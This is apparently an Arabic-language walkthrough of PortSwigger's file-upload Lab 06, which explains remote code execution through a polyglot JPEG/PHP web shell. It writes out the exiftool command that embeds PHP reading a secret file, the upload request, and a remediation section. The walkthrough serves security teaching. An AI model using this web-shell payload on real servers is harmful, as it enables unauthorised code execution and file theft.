# Lab 06 — Remote Code Execution via Polyglot Web Shell Upload (الصور الهجينة Polyglot عبر exiftool)

[![التصنيف](https://img.shields.io/badge/الفئة-File%20Upload-indigo)]()
[![النوع](https://img.shields.io/badge/النوع-File%20Upload%20—%20Polyglot%20Validation%20Bypass-orange)]()
[![مستوى الخطورة](https://img.shields.io/badge/الخطورة-حرج%20(Critical)-critical)]()
[![المصدر](https://img.shields.io/badge/المصدر-PortSwigger%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> هذا الشرح جزء من سلسلة [معامل ثغرات رفع الملفات (File Upload)](./README.md) — أكاديمية PortSwigger.

---

## 1. بطاقة تعريف اللاب (Overview)

| الحقل | التفاصيل |
|---|---|
| **اسم اللاب** | Lab 06 — Remote Code Execution via Polyglot Web Shell Upload (الصور الهجينة Polyglot عبر exiftool) |
| **تصنيف الثغرة** | File Upload — Polyglot Validation Bypass |
| **معيار الضعف (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **مستوى الخطورة** | حرج (Critical) |
| **الهدف من اللاب** | صناعة ملف صورة JPEG حقيقي وهجين يحتوي على شل PHP داخل بيانات الـ EXIF وقراءة السر. |

---

## 2. فكرة اللاب وسيناريو المشكلة (Concept & Vulnerability Mechanism)

قام المطور هنا بوضع أقوى أنواع الفحص: يقوم السيرفر بفتح الملف المرفوع باستخدام مكتبة معالجة صور حقيقية للتأكد من أبعاد الصورة وسلامة هيكلها بالكامل؛ إذا وجد أي خلل أو ملف نصي مزيف، يرفض الرفع فوراً!

**فكرة الالتفاف العبقرية (Polyglot Files):**
ملف الـ Polyglot هو ملف صالح برمجياً ومطابق للمواصفات في صيغتين مختلفتين في آن واحد!
نأتي بصورة JPEG حقيقية وصالحة 100%، ونستخدم أداة `exiftool` لحقن كود PHP مصغر داخل حقل التعليقات (Comment) في ميتاداتا الصورة:
`exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" test.jpg -o polyglot.php`.
1. **بالنسبة لمكتبة السيرفر:** الملف صورة JPEG سليمة وقابلة للعرض وتجتاز كل الفحوصات!
2. **بالنسبة لمفسر PHP:** عند زيارة `polyglot.php`، يقوم مفسر PHP بمسح الملف سطراً بسطر؛ يتجاهل بايتات الصورة غير المفهومة حتى يعثر على وسم `<?php ... ?>` فيقوم بتنفيذه وعرض النتيجة!

---

## 3. التحليل الجذري للسبب (Root Cause Analysis)

### 🔴 وجهة نظر المهاجم (Attacker Perspective):
المهاجم يدمج كود الـ PHP داخل ميتاداتا صورة حقيقية بحيث تجتاز فحص مكتبات الصور وتنفذ عند طلبها بامتداد PHP.

### 🟢 وجهة نظر المدافع والمطور (Defender Perspective):
السماح بحفظ الملفات بامتداد `.php` طالما اجتازت فحص الصورة، مع استمرار تفعيل مفسر PHP داخل مجلد الأصول الثابتة.

---

## 4. خطوات الاستغلال والحل بالتفصيل (Proof of Concept - PoC)

1. أحضر أي صورة JPEG حقيقية وصغيرة على جهازك (مثلاً `image.jpg`).
2. افتح التيرمينال واستخدم أداة `exiftool` لحقن كود الـ PHP في تعليقات الصورة مع حفظها بامتداد `.php`:
```bash
exiftool -Comment="<?php echo file_get_contents('/home/carlos/secret'); ?>" image.jpg -o polyglot.php
```
3. سجل دخولك بحساب `wiener:peter` وارفع ملف `polyglot.php` كصورة شخصية.
4. ستلاحظ أن السيرفر فحص الصورة واعتبرها سليمة ووافق على رفعها!
5. افتح رابط الصورة في المتصفح:
`/files/avatars/polyglot.php`.
6. ستظهر لك رموز الصورة المشوهة وبداخلها السر المطلوب لحل اللاب!

---

## 5. أدلة الترافيك (Evidence: Request / Response)

### نموذج طلب الاستغلال (Exploit Request):
```http
POST /my-account/avatar HTTP/1.1
Host: <lab-id>.web-security-academy.net
Content-Type: multipart/form-data; boundary=----

------
Content-Disposition: form-data; name="avatar"; filename="polyglot.php"
Content-Type: image/jpeg

ÿØÿà...<?php echo file_get_contents('/home/carlos/secret'); ?>...
------
```

### نموذج استجابة السيرفر (Server Response):
```http
HTTP/1.1 200 OK

The file avatars/polyglot.php has been uploaded.
```

---

## 6. الأثر الواقعي للثغرة (Impact)

تنفيذ كود كامل عبر تجاوز أعتى فلاتر فحص محتوى وهيكل الصور.

---

## 7. الحماية والإغلاق البرمجي (Remediation)

إعادة معالجة الصورة ورسمها من الصفر (Strip Metadata & Re-encode)، وعدم السماح بحفظ الملفات بامتداد `.php` إطلاقاً.

---

## 8. المراجع الرسمية (References)

- [PortSwigger Web Security Academy — File Upload](https://portswigger.net/web-security/file-upload)
- [OWASP Top 10 — Vulnerabilities](https://owasp.org/)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---
*تم إعداد هذا التوثيق للأغراض التعليمية واختبار الاختراق الأخلاقي المصرح به.*
